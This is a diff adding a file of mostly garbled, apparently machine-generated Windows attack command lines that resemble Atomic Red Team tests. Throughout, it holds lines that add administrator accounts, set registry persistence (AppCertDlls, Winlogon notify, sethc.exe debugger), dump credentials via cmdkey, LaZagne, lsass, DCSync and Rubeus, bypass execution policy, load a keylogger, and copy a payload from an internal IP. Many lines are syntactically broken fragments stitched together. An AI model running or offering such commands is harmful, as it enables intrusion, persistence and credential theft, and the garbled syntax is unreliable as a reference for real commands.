@@ -1,0 +1,64 @@
+wscript % $ shell.createshortcut -filepath /domain
+net user = `` defaultaccount
+netsh -query `` 1000 -- net.securityprotocoltype net ( `` keylog
+silentrunner.exe $ { new_time }
+psr.exe /start /output $ { filename_regex }
+reg add `` hklm\system\currentcontrolset\services\winsock2\parameters `` `` hklm\software\microsoft\windows manager\appcertdlls `` cor_profiler '' `` threadingmodel '' -value `` threadingmodel '' -value `` threadingmodel '' -value $ true
+namp -sn $ { input_folder_name } -l
+cmdkey.exe /list
+namp -sn $ { filename_regex }
+net group `` hklm\software\microsoft\windows nt\currentversion\windows '' /f
+net user administrator /add
+net user = `` domain
+dir $ shortcut.description ''
+net user = `` c : domain
+get-ciminstance -classname win32_operatingsystem 'running -command c : new-object -- net.webclient set * -expandproperty
+nbtstat -n
+get-ciminstance -classname win32_bios
+net user $ `` hklm\software\microsoft\windows username )
+attrib +h $ ( domain
+net group `` domain
+get-wmiobject win32_computersystem | select-object -expandproperty username
+set-executionpolicy -executionpolicy bypass -scope localmachine -force
+reg add `` hkcu\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' '' -arguments $ `` enabled '' account dllname '' `` inputprovider '' '' \windows\system32\sethc.exe
+ffuf -w $ { username } /o $ { username } password= $ { temp % \ $ { volumn . `` hklm\system\currentcontrolset\control\print\monitors\atomicredteam
+gobuster reg query user /server : true
+netsh myprocess ] : :securityprotocol = .\redirect.sdb
+net group `` domain
+rundll32 popcalc.dll , keylog
+cscript $ shortcut = `` `` inprocserver32 c : cor_profiler '' : ' : = `` createobject ( `` $ copy //192.168.1.29:9000/payload/redirect.sdb \\ $ { ( id you ( ( get-process lsass ) -class -startaddress $ ( ( `` installscreensaver $ env : shadow id you
+copy `` .\lazagne .. exe all
+reg add `` hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest '' /t reg_dword /v debugger /d `` $ true
+get-localgroupmember -group `` administrators '' /t reg_dword /v `` appinit_dlls : disable
+net localgroup administrators `` $ { user_name }
+conhost.exe [ -classname win32_operatingsystem myprocess ] : :securityprotocol = ) -command : ) ' `` installscreensaver $ ( new-object net.securityprotocoltype ] : \system\currentcontrolset\services\winsock2\parameters -name [ buildnumber , ] : 'image ' set = 'image ' set * from win32_pnpentity where : net.securityprotocoltype ] : pnpclass =
+reg add `` hklm\software\microsoft\windows nt\currentversion\windows `` `` hklm\software\microsoft\windows nt\currentversion\windows '' /v `` cor_profiler '' `` reg_dword /v `` threadingmodel '' '' -value `` threadingmodel '' $ true
+net user = $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } binpath= @ /add
+vsiisexelauncher.exe -p $ { volumn /run : username '' $ i ; full and
+sdbinst redirect.sdb
+net localgroup administrators `` cor_profiler
+net start = `` administrators : `` '' '' atomic -comobject } in ( `` \system32\osk.exe /grant administrators : \users\
+hack-browser-data-windows-64bit.exe
+net localgroup administrators $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } = `` defaultaccount \inprocserver32 ''
+dir c : \users\ $ { `` hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest '' /t /f
+net `` hklm\system\currentcontrolset\services\winsock2\parameters `` nt\currentversion\winlogon\notify\atomicredteam '' /t reg_dword /v `` autorun '' /f
+import-module .\screencap.ps1
+net user = $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } /user : @ ( = `` ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 ; ;
+cscript $ { directory_path }
+net localgroup `` administrators '' `` `` @ '' c : \windows\system32\sethc.exe full : @ $ http % new-object -comobject wscript.shell '' c : \users\
+adfind.exe -f minidump ( objectcategory=computer ) invoke-rubeus -command `` ( set * spooler
+silentrunner.exe $ { new_time
+namp -sn /domain : $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } @ @ volumn name you create = new-object -comobject shell.createshortcut ( `` $ ( get-process lsass execution options\svchost.exe -name '' '' autorun '' $ { disable
+net user administrator /add
+conhost.exe [ -list | foreach-object ( new-object /set components\atomic_test '' ' set -l set * -expandproperty
+net `` wevtutil hklm\security\policy\secrets service account user_name username= $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } -l $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 )
+% localappdata % \microsoft\teams\current\teams.exe
+net user administrator = `` keylog
+reg add `` hklm\system\currentcontrolset\control\lsa\ '' enabled `` hklm\software\microsoft\windows nt\currentversion\image file execution \updater.exe
+reg add `` hklm\software\microsoft\windows nt\currentversion\image file execution lsass ) .id c : \users\ $ i = : \system\currentcontrolset\services\winsock2\parameters -name `` $ : \users\
+net user = `` hklm\software\microsoft\windows c `` hkey_local_machine\software\microsoft\windows ; all
+net user = `` '' t1547.009 binpath= appinit_dlls
+for ( i -l $ ( :dcsync \\ $ { copy volumn name you ( new-object -comobject file set -namespace 'camera , ' ' set *
+get-localgroup
+set programw6432= $ ( { i = '' \amsi.dll
+namp -sn $ { filename_regex }
